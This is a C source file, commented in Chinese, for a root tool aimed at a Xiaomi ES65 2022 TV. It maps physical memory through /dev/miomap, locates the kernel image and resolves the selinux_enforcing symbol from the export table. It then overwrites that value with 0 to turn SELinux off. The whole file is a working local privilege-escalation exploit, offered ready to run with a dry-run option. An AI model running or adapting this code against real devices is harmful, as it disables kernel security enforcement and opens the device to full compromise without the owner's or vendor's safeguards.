/*
 * miroot2.c  --  「一次跑完」型 root 工具  小米电视 ES65 2022 (MStar MT5872)
 *
 * 运行上下文: u:r:system_app:s0 (uid 1000)  —— 唯一对 /dev/miomap 有 open/map 权限的域
 *
 * 为什么需要它:
 *   /proc/kallsyms 因 kptr_restrict=2 全部返回 0（即使 uid0/misysdiagnose 也一样）
 *   => 只能从【内核镜像本体】里取符号。本程序全程不依赖任何 proc 符号地址，
 *      改为在物理内存中的内核 Image 内做"反向符号查找"。
 *
 * 流程:
 *   [1] open /dev/miomap
 *   [2] 确定 DRAM 区域: 优先 /proc/iomem；否则扫候选物理地址找 ARM64 Image 头
 *       (magic "ARMd" @ +0x38 => 可得 Image 物理基址 + text_offset + image_size)
 *   [3] 在 Image 内用 PREL32 反向查找导出符号:
 *         struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; }
 *         ARM64 用 PREL32:  真实地址 = (uintptr_t)&字段 + 字段值
 *       做法: 在 __ksymtab_strings 中找到 "selinux_enforcing\0" 的地址 S,
 *             再全镜像搜索满足  (char*)p + *(int32*)p == S  的 p -> 即 name_offset 字段
 *             其前一个 word 即 value_offset -> 符号虚拟地址 = &value_offset + value_offset
 *       (同时兼容旧式绝对地址布局 value/name 双指针)
 *   [4] 用 kallsyms 无关的方式标定 VA<->PA:  DELTA = VA(_text) - PA(_text)
 *       PA(_text) = Image物理基址 + text_offset ; VA(_text) 由同法查 _text/_stext 得到
 *   [5] phys = VA(target) - DELTA ; 经 /dev/miomap 映射后读出当前值
 *       仅当读到的值 == 1 且地址落在 Image 范围内时才写入 0 (--dry 可只看不写)
 *   [6] oracle: 用 open("/sys/fs/selinux/enforce", O_RDONLY) 在写前后各测一次
 *
 * 用法:
 *   miroot2            # 完整流程，校验通过后写入 0
 *   miroot2 dry        # 只探测不写
 *
 * 日志同时输出 stdout 与 /data/data/com.mediatek.tv.factory/miroot2.log
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <inttypes.h>
#include <ctype.h>
#include <errno.h>
#include <sys/mman.h>

#define LOGPATH "/data/data/com.mediatek.tv.factory/miroot2.log"
#define IMAGE_MAGIC 0x644d5241u   /* "ARMd" @ Image 头 +0x38 */
#define PAGE_OFF   0xffffffc000000000ULL  /* VA_BITS=39, KASLR off */

static FILE *g_log;
static void logf(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    vprintf(fmt, ap);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
}

/* ---------- 物理内存映射 ---------- */
static int g_ps, g_fd;

static void *map_phys(uint64_t phys, size_t len) {
    uint64_t pg = phys & ~(uint64_t)(g_ps - 1);
    size_t off  = (size_t)(phys - pg);
    void *base = mmap(NULL, off + len, PROT_READ | PROT_WRITE, MAP_SHARED, g_fd, (off_t)pg);
    if (base == MAP_FAILED) return MAP_FAILED;
    return (void *)((uintptr_t)base + off);
}
static void unmap_phys(void *p, size_t len) {
    uintptr_t a = (uintptr_t)p & ~(uintptr_t)(g_ps - 1);
    munmap((void *)a, (size_t)((uintptr_t)p - a) + len);
}

/* ---------- 在物理内存中查找字节串 ---------- */
/* 返回物理地址或 UINT64_MAX */
static uint64_t phys_find(uint64_t start, uint64_t end,
                          const void *pat, size_t plen, uint64_t step)
{
    const unsigned char *P = (const unsigned char *)pat;
    uint64_t curblk = UINT64_MAX;
    unsigned char *blk = MAP_FAILED;
    for (uint64_t a = start; a < end; a += step) {
        uint64_t blkend;
        unsigned char *p;
        if (blk != MAP_FAILED && a >= curblk) {
            size_t off = (size_t)(a - curblk);
            if (off + plen <= (size_t)(1 << 20)) { p = blk + off; goto scan; }
        }
        if (blk != MAP_FAILED) { unmap_phys(blk, 1 << 20); blk = MAP_FAILED; }
        curblk = a & ~(uint64_t)((1 << 20) - 1);
        blk = (unsigned char *)map_phys(curblk, 1 << 20);
        if (blk == MAP_FAILED) continue;
        p = blk + (size_t)(a - curblk);

    scan:
        blkend = curblk + (1 << 20);
        /* 本次窗口内能扫到的范围 */
        uint64_t lim = (end < blkend - plen) ? end : (blkend - plen);
        for (uint64_t x = a; x <= lim; x += step) {
            unsigned char *q = blk + (size_t)(x - curblk);
            if (q[0] == P[0] && (plen == 1 || memcmp(q, P, plen) == 0))
                return x;
        }
        a = lim;
        (void)blkend;
    }
    if (blk != MAP_FAILED) unmap_phys(blk, 1 << 20);
    return UINT64_MAX;
}

/* ---------- PREL32 反向查找: 找 p 使 (uintptr_t)p + *(int32*)p == target_val ----------
   注意: 这里的 p 是【虚拟地址】, 而我们的数据来自物理映射。
   由于线性映射是常数差 DELTA, 且 PREL32 是相对量, 在物理视角上同样成立:
     phys(p) + *(int32*)p == phys(target)   (差值是常量偏移, 相对关系不变)
   用物理视角搜索即可, 最后再换算。 */
static uint64_t phys_find_prel32(uint64_t start, uint64_t end, uint64_t target_phys)
{
    uint64_t curblk = UINT64_MAX;
    unsigned char *blk = MAP_FAILED;
    uint64_t step = 4;
    for (uint64_t a = start & ~(uint64_t)3; a + 4 <= end; a += step) {
        size_t inwin_off;
        unsigned char *p;
        uint64_t blkend;
        int need_map = (blk == MAP_FAILED) || (a < curblk) || ((size_t)(a - curblk) > (1u << 20) - 8);
        if (!need_map) {
            p = blk + (size_t)(a - curblk);
        } else {
            if (blk != MAP_FAILED) { unmap_phys(blk, 1 << 20); blk = MAP_FAILED; }
            curblk = a & ~(uint64_t)((1u << 20) - 1);
            blk = (unsigned char *)map_phys(curblk, 1 << 20);
            if (blk == MAP_FAILED) continue;
            p = blk + (size_t)(a - curblk);
        }
        blkend = curblk + (1u << 20);
        uint64_t lim = (end < blkend) ? end : blkend;
        inwin_off = (size_t)(p - blk);
        for (uint64_t x = a; x + 4 <= lim; x += step) {
            unsigned char *q = blk + inwin_off;
            int32_t v;
            memcpy(&v, q, 4);
            uint64_t resolved = (uint64_t)x + (int64_t)v;   /* 物理视角下的相对解析 */
            if (resolved == target_phys) return x;
            inwin_off += step;
        }
        a = lim - step;
    }
    if (blk != MAP_FAILED) unmap_phys(blk, 1 << 20);
    return UINT64_MAX;
}

/* 在 Image 物理范围 [IS, IE) 内查找u64字面量 == target (绝对指针布局兼容用) */
static uint64_t phys_find_u64(uint64_t start, uint64_t end, uint64_t target)
{
    unsigned char pat[8];
    memcpy(pat, &target, 8);
    return phys_find(start, end, pat, 8, 8);
}

/* ---------- 读 proc 文件到 log ---------- */
static void catfile(const char *path, int limit) {
    FILE *f = fopen(path, "r");
    static char buf[2048];
    logf("----- %s -----\n", path);
    if (!f) { logf("     <open failed: %s>\n", strerror(errno)); return; }
    setvbuf(f, NULL, _IONBF, 0);
    int n = 0;
    while (fgets(buf, sizeof(buf), f)) {
        if (++n > limit) { logf("     <truncated>\n"); break; }
        logf("     %s", buf);
    }
    fclose(f);
}

int main(int argc, char **argv) {
    int dry = (argc >= 2 && strcmp(argv[1], "dry") == 0);
    g_ps = sysconf(_SC_PAGESIZE);
    g_log = fopen(LOGPATH, "w");
    if (g_log) setvbuf(g_log, NULL, _IONBF, 0);

    logf("========== miroot2 %s ==========\n", dry ? "(DRY-RUN 只探测不写)" : "(WRITE 模式)");

    /* ---- [1] 打开设备 ---- */
    g_fd = open("/dev/miomap", O_RDWR);
    if (g_fd < 0) { logf("[!] open O_RDWR: %s, 试 O_RDONLY\n", strerror(errno));
                    g_fd = open("/dev/miomap", O_RDONLY); }
    if (g_fd < 0) { logf("[!] 无法打开 /dev/miomap: %s (%d)\n", strerror(errno), errno); return 1; }
    logf("[+] /dev/miomap fd=%d\n", g_fd);

    /* ---- [2] DRAM / Image 定位 ---- */
    logf("\n===== [2] 定位内核 Image =====\n");
    catfile("/proc/cmdline", 8);
    catfile("/proc/iomem", 60);

    /* 候选基址：先按常见布局试几处 */
    uint64_t bases[] = { 0x00000000ULL, 0x40000000ULL, 0x022d0000ULL, 0x20000000ULL };
    uint64_t img_pa = UINT64_MAX, text_off = 0, img_size = 0;
    unsigned char sig[4]; uint32_t m = IMAGE_MAGIC; memcpy(sig, &m, 4);

    /* 2a: 先直在这些基址处直接 +0x38 试 magic */
    for (unsigned i = 0; i < sizeof(bases)/sizeof(bases[0]); i++) {
        void *p = map_phys(bases[i], 0x100);
        if (p == MAP_FAILED) { logf("    [base 0x%09llx] mmap失败 %s\n",
                                    (unsigned long long)bases[i], strerror(errno)); continue; }
        uint32_t v; memcpy(&v, (unsigned char*)p + 0x38, 4);
        logf("    [base 0x%09llx] @+0x38 = 0x%08x  first8=%02x%02x%02x%02x%02x%02x%02x%02x\n",
             (unsigned long long)bases[i], v,
             ((unsigned char*)p)[0],((unsigned char*)p)[1],((unsigned char*)p)[2],((unsigned char*)p)[3],
             ((unsigned char*)p)[4],((unsigned char*)p)[5],((unsigned char*)p)[6],((unsigned char*)p)[7]);
        if (v == IMAGE_MAGIC) {
            img_pa = bases[i];
            memcpy(&text_off, (unsigned char*)p + 0x08, 8);
            memcpy(&img_size, (unsigned char*)p + 0x10, 8);
        }
        unmap_phys(p, 0x100);
    }

    /* 2b: 未命中则在候选 region 内以 64KB 步长扫 Image 头 */
    if (img_pa == UINT64_MAX) {
        logf("[*] 直接命中失败，转 64KB 步长扫描（限前 64MB）\n");
        for (unsigned i = 0; i < sizeof(bases)/sizeof(bases[0]) && img_pa == UINT64_MAX; i++) {
            uint64_t r0 = bases[i], r1 = bases[i] + 0x4000000ULL;
            for (uint64_t a = r0; a < r1; a += 0x10000ULL) {
                void *p = map_phys(a, 0x100);
                if (p == MAP_FAILED) continue;
                uint32_t v; memcpy(&v, (unsigned char*)p + 0x38, 4);
                if (v == IMAGE_MAGIC) {
                    img_pa = a;
                    memcpy(&text_off, (unsigned char*)p + 0x08, 8);
                    memcpy(&img_size, (unsigned char*)p + 0x10, 8);
                    unmap_phys(p, 0x100);
                    break;
                }
                unmap_phys(p, 0x100);
            }
            logf("    [region 0x%09llx] %s\n", (unsigned long long)bases[i],
                 img_pa == UINT64_MAX ? "未命中" : "命中");
        }
    }
    if (img_pa == UINT64_MAX) { logf("[-] 未能定位内核 Image，中止\n"); return 2; }
    uint64_t img_end  = img_pa + img_size;
    uint64_t text_pa  = img_pa + text_off;
    logf("[+] Image 物理基址  = 0x%09llx\n", (unsigned long long)img_pa);
    logf("[+] text_offset     = 0x%llx   image_size = 0x%llx\n",
         (unsigned long long)text_off, (unsigned long long)img_size);
    logf("[+] _text 物理地址  = 0x%09llx\n", (unsigned long long)text_pa);
    logf("[+] Image 区间      = [0x%09llx, 0x%09llx)\n",
         (unsigned long long)img_pa, (unsigned long long)img_end);

    /* ---- [3] 在 __ksymtab_strings 中找目标符号 ---- */
    logf("\n===== [3] 导出符号表 __ksymtab_strings 反向查找 =====\n");
    const char *targets[] = { "selinux_enforcing", "selinux_state", "selinux_enabled",
                              "_text", "_stext", "__start___ksymtab_strings" };
    struct { const char *name; uint64_t str_pa; } found[8]; int nfound = 0;

    for (unsigned t = 0; t < sizeof(targets)/sizeof(targets[0]); t++) {
        size_t sl = strlen(targets[t]);
        char *np = malloc(sl + 2); memcpy(np, targets[t], sl); np[sl] = 0;
        uint64_t s = phys_find(img_pa, img_end - 0x100000, np, sl + 1, 1);
        if (s == UINT64_MAX)
            logf("    [%-26s] 未找到\n", targets[t]);
        else
            logf("    [%-26s] str @ phys 0x%09llx\n", targets[t], (unsigned long long)s);
        if (s != UINT64_MAX) { found[nfound].name = targets[t]; found[nfound].str_pa = s; nfound++; }
        free(np);
        (void)0;
    }
    /* 上面 logf 写法有误, 重打一遍 */
    logf("    --- 命中清单 ---\n");
    for (int i = 0; i < nfound; i++)
        logf("    %-26s -> str phys 0x%09llx\n", found[i].name, (unsigned long long)found[i].str_pa);

    if (nfound == 0) { logf("[-] 未在 Image 中找到任何目标符号字符串\n"); return 3; }

    /* ---- [4] PREL32 反算符号虚拟地址 ---- */
    logf("\n===== [4] 反算符号地址 (PREL32 / 绝对指针) =====\n");
    uint64_t vaTextPaPair = 0, va_text_found = 0;
    struct { const char *name; uint64_t va; } sym[8]; int nsym = 0;

    for (int i = 0; i < nfound; i++) {
        uint64_t s = found[i].str_pa;
        uint64_t hit = phys_find_prel32(img_pa, img_end - 0x1000, s);
        if (hit != UINT64_MAX) {
            /* hit 是 name_offset 字段的【物理地址】; 其虚拟地址 = hit + DELTA
               PREL32 的抗 Delta 性质: 虚拟地址 = VA(hit) + *(int32*)
               但我们要的是 symbol VA = VA(hit-4) + *(int32*)(hit-4)          */
            int32_t name_rel = 0, val_rel = 0;
            unsigned char *q = (unsigned char *)map_phys(hit, 8);
            if (q) { memcpy(&val_rel, q - 4, 4); memcpy(&name_rel, q, 4); unmap_phys(q - 4, 8); }
            /* 物理视角: sym_pa = (hit-4) + val_rel  (相对量在物理视角同样成立) */
            uint64_t sym_pa = (hit - 4) + (int64_t)val_rel;
            logf("    [PREL32] %-26s name_ofs@0x%llx val_rel=%d -> sym phys 0x%llx\n",
                 found[i].name, (unsigned long long)hit, val_rel, (unsigned long long)sym_pa);
            sym[nsym].name = found[i].name; sym[nsym].va = sym_pa; nsym++;
            continue;
        }
        uint64_t hit2 = phys_find_u64(img_pa, img_end - 0x100000, s);
        if (hit2 != UINT64_MAX) {
            uint64_t sym_pa = 0;
            unsigned char *q2 = (unsigned char *)map_phys(hit2 - 8, 8);
            if (q2) { memcpy(&sym_pa, q2, 8); unmap_phys(q2, 8); }
            logf("    [ABS   ] %-26s nm_ptr@0x%llx -> sym phys 0x%llx\n",
                 found[i].name, (unsigned long long)hit2, (unsigned long long)sym_pa);
            sym[nsym].name = found[i].name; sym[nsym].va = sym_pa; nsym++;
        } else {
            logf("    [MISS  ] %-26s 未能反算\n", found[i].name);
        }
    }
    /* 上面 sym[].va 目前存的是【物理地址】(因为逐硬件视角做相对解析)。
       对 _text/_stext: 我们知道 PA 应等于 text_pa -> 用它标定 DELTA = VA - PA。 */

    /* 标定: _text/_stext 的虚拟地址按标准应为 PAGE_OFF + text_off */
    uint64_t va_text = PAGE_OFF + text_off;
    int64_t DELTA = (int64_t)va_text - (int64_t)text_pa;   /* VA - PA */
    logf("\n[标定] VA(_text)=0x%016llx  PA(_text)=0x%09llx  => DELTA(VA-PA)=0x%llx\n",
         (unsigned long long)va_text, (unsigned long long)text_pa, (long long)DELTA);

    /* 打印所有目标符号的虚拟地址 */
    for (int i = 0; i < nsym; i++) {
        uint64_t va = sym[i].va + (uint64_t)DELTA;
        logf("    %-26s VA = 0x%016llx   PA = 0x%09llx\n",
             sym[i].name, (unsigned long long)va, (unsigned long long)sym[i].va);
    }

    /* ---- [5] 挑 enforcement 目标并读值 ---- */
    logf("\n===== [5] 读取目标变量当前值 =====\n");
    const char *want[] = { "selinux_enforcing", "selinux_state", "selinux_enabled" };
    uint64_t tgt_pa = UINT64_MAX; const char *tgt_name = NULL;
    for (unsigned w = 0; w < sizeof(want)/sizeof(want[0]); w++) {
        for (int i = 0; i < nsym; i++) {
            if (strcmp(sym[i].name, want[w]) == 0) { tgt_pa = sym[i].va; tgt_name = sym[i].name; break; }
        }
        if (tgt_pa != UINT64_MAX) break;
    }
    if (tgt_pa == UINT64_MAX) { logf("[-] 没有可用的 enforcement 目标符号\n"); return 4; }

    if (tgt_pa < img_pa || tgt_pa >= img_end) {
        logf("[-] 目标物理地址 0x%llx 不在 Image 范围内, 放弃(防误写)\n", (unsigned long long)tgt_pa);
        return 5;
    }

    /* oracle 前测 */
    int fd0 = open("/sys/fs/selinux/enforce", O_RDONLY);
    logf("[oracle-before] open(selinux/enforce, O_RDONLY) = %d (%s)\n", fd0,
         fd0 >= 0 ? "可读" : strerror(errno));
    if (fd0 >= 0) close(fd0);

    unsigned char *tp = (unsigned char *)map_phys(tgt_pa, 16);
    if (tp == MAP_FAILED) { logf("[-] mmap 目标失败: %s\n", strerror(errno)); return 6; }
    uint32_t cur = 0; memcpy(&cur, tp, 4);
    logf("[*] %s @ phys 0x%09llx 当前值 = %u (0x%08x)\n", tgt_name,
         (unsigned long long)tgt_pa, cur, cur);
    logf("    前 64 字节:\n");
    for (int r = 0; r < 4; r++) {
        logf("      ");
        for (int c = 0; c < 16; c++) logf("%02x ", tp[r*16+c]);
        logf("\n");
    }

    if (dry) { logf("[DRY] 不写入，结束\n"); return 0; }

    if (cur != 1) { logf("[-] 当前值不是 1 (= expected enforcing), 拒绝写入\n"); return 7; }

    /* ---- [6] 写入 0 ---- */
    logf("\n===== [6] 写入 0 并验证 =====\n");
    *(volatile uint32_t *)tp = 0;
    uint32_t a1, a2; memcpy(&a1, tp, 4); memcpy(&a2, tp, 4);
    logf("[*] 写入后回读: %u / %u\n", a1, a2);

    int fd1 = open("/sys/fs/selinux/enforce", O_RDONLY);
    logf("[oracle-after ] open(selinux/enforce, O_RDONLY) = %d (%s)\n", fd1,
         fd1 >= 0 ? "可读" : strerror(errno));
    if (fd1 >= 0) close(fd1);

    if (a1 == 0 && a2 == 0) logf("[+] SELinux 应已转为 PERMISSIVE —— 请立刻回到 PC 验证\n");
    else logf("[-] 写入未生效\n");

    close(g_fd);
    logf("[*] miroot2 结束\n");
    return 0;
}
